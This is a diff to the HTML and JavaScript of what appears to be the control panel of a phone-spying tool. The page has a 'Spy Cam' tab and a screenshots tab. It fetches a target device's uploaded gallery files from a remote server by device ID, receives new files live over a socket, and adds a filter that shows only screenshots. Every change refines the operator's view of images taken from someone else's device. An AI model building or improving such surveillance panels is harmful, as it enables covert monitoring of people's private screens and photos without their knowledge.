@@ -9,6 +9,7 @@
     <style>
         * { box-sizing: border-box; }
         body { background: #0f0f0f; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; min-height: 100vh; }
+        
         .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
         .back-btn { background: rgba(255,255,255,0.1); padding: 10px 15px; border-radius: 12px; color: #fff; text-decoration: none; }
         .page-title { font-weight: bold; text-transform: uppercase; letter-spacing: 1px; color: #00f3ff; } 
@@ -17,27 +18,27 @@
         .tabs-container { display: flex; gap: 15px; margin-bottom: 25px; background: rgba(255,255,255,0.05); padding: 8px; border-radius: 15px; }
         .tab-btn { flex: 1; padding: 12px; border: none; background: transparent; color: #666; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; border-radius: 10px; transition: 0.3s; }
         .tab-btn.active { background: rgba(0, 243, 255, 0.15); color: #00f3ff; border: 1px solid #00f3ff; }
-        .tab-btn.inactive:hover { background: rgba(255,255,255,0.1); color: #fff; }
-
-        /* GRID */
-        .gallery-container { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding-bottom: 20px; }
-        .img-card { background: #000; border-radius: 12px; overflow: hidden; position: relative; border: 1px solid #333; height: 250px; display: flex; align-items: center; justify-content: center; }
-        .img-card img { width: 100%; height: 100%; object-fit: contain; }
-        .source-badge { position: absolute; bottom: 0; width: 100%; background: rgba(0,0,0,0.8); color: #00f3ff; font-size: 0.7rem; padding: 6px; text-align: center; text-transform: uppercase; font-weight: bold; }
-
-        /* UTILS */
-        .loader { border: 3px solid #333; border-top: 3px solid #00f3ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status-msg { text-align: center; color: #666; margin-top: 50px; }
         
-        /* Loading Text for Bottom */
+        /* GRID - Screenshots usually vertical, fit nicely */
+        .gallery-container { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding-bottom: 20px; }
+        .img-card { background: #000; border-radius: 12px; overflow: hidden; position: relative; border: 1px solid #333; height: 300px; display: flex; align-items: center; justify-content: center; }
+        .img-card img { width: 100%; height: 100%; object-fit: contain; }
+        .time-badge { position: absolute; bottom: 0; width: 100%; background: rgba(0,0,0,0.8); color: #00f3ff; font-size: 0.75rem; padding: 8px; text-align: center; }
+
+        /* LOADING & STATUS */
+        .loader-container { text-align: center; margin-top: 50px; }
+        .loader { border: 3px solid #333; border-top: 3px solid #00f3ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 15px auto; }
+        .scan-text { color: #00f3ff; font-size: 0.9rem; margin-top: 10px; font-family: monospace; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .status-msg { text-align: center; color: #666; margin-top: 50px; font-size: 0.9rem; }
         .bottom-loader { text-align: center; padding: 20px; color: #888; font-size: 0.8rem; display: none; }
 
         /* MODAL */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
-        .modal img { max-width: 100%; max-height: 80vh; object-fit: contain; }
+        .modal img { max-width: 100%; max-height: 85vh; object-fit: contain; }
         .modal-actions { margin-top: 20px; display: flex; gap: 15px; }
-        .action-btn { background: #333; color: #fff; padding: 8px 20px; border-radius: 20px; text-decoration: none; border: 1px solid #555; }
+        .action-btn { background: #333; color: #fff; padding: 10px 25px; border-radius: 25px; text-decoration: none; border: 1px solid #555; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -53,24 +54,31 @@
             <i class="fa-solid fa-eye"></i> Spy Cam
         </button>
         <button class="tab-btn active">
-            <i class="fa-solid fa-mobile-screen"></i> Screen Only
+            <i class="fa-solid fa-mobile-screen"></i> Screenshots Only
         </button>
     </div>
 
-    <div id="loading" class="loader"></div>
+    <div id="loadingArea" class="loader-container">
+        <div class="loader"></div>
+        <div class="scan-text" id="scanStatus">Scanning for screenshots...</div>
+    </div>
     
-    <div id="emptyState" class="status-msg" style="display: none;">No Screenshots found.</div>
+    <div id="emptyState" class="status-msg" style="display: none;">
+        <i class="fa-solid fa-folder-open" style="font-size: 2rem; margin-bottom: 10px;"></i><br>
+        No Screenshots found yet.<br>
+        (Skipping Gallery & Camera files)
+    </div>
     
     <div class="gallery-container" id="galleryGrid"></div>
     
     <div id="bottomLoader" class="bottom-loader">
-        <i class="fa-solid fa-circle-notch fa-spin"></i> Loading more...
+        <i class="fa-solid fa-filter"></i> Filtering more files...
     </div>
 
     <div id="imageModal" class="modal" onclick="if(event.target === this) closeModal()">
         <img id="fullImage" src="">
         <div class="modal-actions">
-            <a id="downloadLink" href="#" target="_blank" class="action-btn">Download</a>
+            <a id="downloadLink" href="#" target="_blank" class="action-btn"><i class="fa-solid fa-download"></i> Download</a>
             <button onclick="closeModal()" class="action-btn">Close</button>
         </div>
     </div>
@@ -83,9 +91,11 @@
         let allFilesData = [];
         let nextCursor = null;
         let isLoading = false;
+        let totalScanned = 0;
+        let screenshotsFound = 0;
         
-        // Kitne screenshot screen pe hone chahiye tab loading rukegi
-        const MIN_ITEMS_TO_SHOW = 10; 
+        // Kam se kam itne screenshots milne chahiye tab loading rukegi
+        const MIN_ITEMS_TO_SHOW = 6; 
 
         const socket = io(API_BASE, { transports: ['websocket', 'polling'] });
 
@@ -98,23 +108,20 @@
             if(!DEVICE_ID) return alert("Device ID Missing!");
             fetchFiles(true);
             
-            // Socket Realtime Update
             socket.on('new-file', (data) => {
                 if (data.device_id === DEVICE_ID) {
-                    let u = data.url.toLowerCase();
-                    if((u.includes('screen') || u.includes('shot')) && !u.includes('gallery')) {
+                    // Realtime mein bhi sirf screenshot allow karenge
+                    if(isScreenshotOnly(data.url)) {
                         if(!allFilesData.includes(data.url)) {
                             allFilesData.unshift(data.url);
-                            renderGallery(false); // Render without hiding loader if running
+                            renderGallery();
                         }
                     }
                 }
             });
         };
 
-        // 🔥 INFINITE SCROLL LOGIC
         window.onscroll = function() {
-            // Agar banda page ke bottom ke pass pahunch gaya
             if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 300) {
                 if(nextCursor && !isLoading) {
                     document.getElementById('bottomLoader').style.display = 'block';
@@ -127,63 +134,75 @@
             if (isLoading) return;
             isLoading = true;
 
-            // Sirf shuru mein bada loader dikhao
-            if(isReset) document.getElementById('loading').style.display = 'block';
+            const loadingArea = document.getElementById('loadingArea');
+            const scanStatus = document.getElementById('scanStatus');
 
-            let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}?limit=50`; 
+            if(isReset) {
+                loadingArea.style.display = 'block';
+                totalScanned = 0;
+                screenshotsFound = 0;
+            }
+
+            // Hum 100-100 karke files mangayenge
+            let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}?limit=100`; 
             if (nextCursor && !isReset) url += `&next_cursor=${nextCursor}`;
 
             fetch(url).then(res => res.json()).then(data => {
                 let newFiles = data.photos || [];
                 
-                // Cursor Update
+                totalScanned += newFiles.length;
+                
                 if (data.next_cursor) nextCursor = data.next_cursor;
                 else nextCursor = null;
 
-                // Data Append
                 if(isReset) allFilesData = newFiles;
                 else allFilesData = [...allFilesData, ...newFiles];
 
-                // 🔥 AUTO-FETCH CHECK
-                // Check karo abhi tak kitne valid Screenshot mile hain
-                const validScreenshots = allFilesData.filter(isScreenshot);
+                // Check karo ab tak kitne screenshots mile
+                const validFiles = allFilesData.filter(isScreenshotOnly);
+                screenshotsFound = validFiles.length;
 
-                if (validScreenshots.length < MIN_ITEMS_TO_SHOW && nextCursor) {
-                    // Agar abhi bhi kam photos hain, to turant agli batch mangao (User ko wait mat karao)
-                    isLoading = false; // Flag reset for recursion
-                    fetchFiles(false);
+                scanStatus.innerText = `Scanned ${totalScanned} files... (Found ${screenshotsFound} Screens)`;
+
+                // LOGIC: Agar screenshot kam hain, aur server ke paas aur files hain, to automatic aur maango
+                if (validFiles.length < MIN_ITEMS_TO_SHOW && nextCursor) {
+                    isLoading = false; 
+                    fetchFiles(false); // Loop wapas chalega
                 } else {
-                    // Kaafi photos mil gayi, ab render karo aur loader chupao
                     renderGallery();
                     isLoading = false;
-                    document.getElementById('loading').style.display = 'none';
+                    loadingArea.style.display = 'none';
                     document.getElementById('bottomLoader').style.display = 'none';
                 }
 
             }).catch(e => {
                 console.error(e);
                 isLoading = false;
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('bottomLoader').style.display = 'none';
+                loadingArea.style.display = 'none';
             });
         }
 
-        // Helper: Check if URL is Screenshot
-        function isScreenshot(url) {
+        // 🔥 STRICT FILTER: Sirf Screenshot Folder Allow Karega
+        function isScreenshotOnly(url) {
             let u = url.toLowerCase();
-            if (u.includes('gallery')) return false; // Gallery hatao
-            if (u.includes('cam') || u.includes('front') || u.includes('back')) return false; // Camera hatao
-            return u.includes('screen') || u.includes('shot'); // Sirf Screenshot
+            
+            // Sirf wahi true hoga jisme 'screenshot' folder ka naam ho
+            // Tumhare image proof ke hisaab se folder ka naam 'screenshot' hi hai
+            if (u.includes('/screenshot/') || u.includes('/screen/')) {
+                return true;
+            }
+
+            // Baaki sab (Gallery, Camera, WhatsApp Images etc) FALSE
+            return false;
         }
 
         function renderGallery() {
             const grid = document.getElementById('galleryGrid');
-            const filtered = allFilesData.filter(isScreenshot);
+            const filtered = allFilesData.filter(isScreenshotOnly);
 
-            grid.innerHTML = ''; // Clear grid
+            grid.innerHTML = ''; 
 
             if(filtered.length === 0) {
-                // Agar sab kuch load hone ke baad bhi 0 hai
                 if(!isLoading) document.getElementById('emptyState').style.display = 'block';
             } else {
                 document.getElementById('emptyState').style.display = 'none';
@@ -195,7 +214,7 @@
                 div.onclick = () => openModal(url);
                 div.innerHTML = `
                     <img src="${url}" loading="lazy">
-                    <div class="source-badge">Screenshot</div>
+                    <div class="time-badge">SCREENSHOT</div>
                 `;
                 grid.appendChild(div);
             });
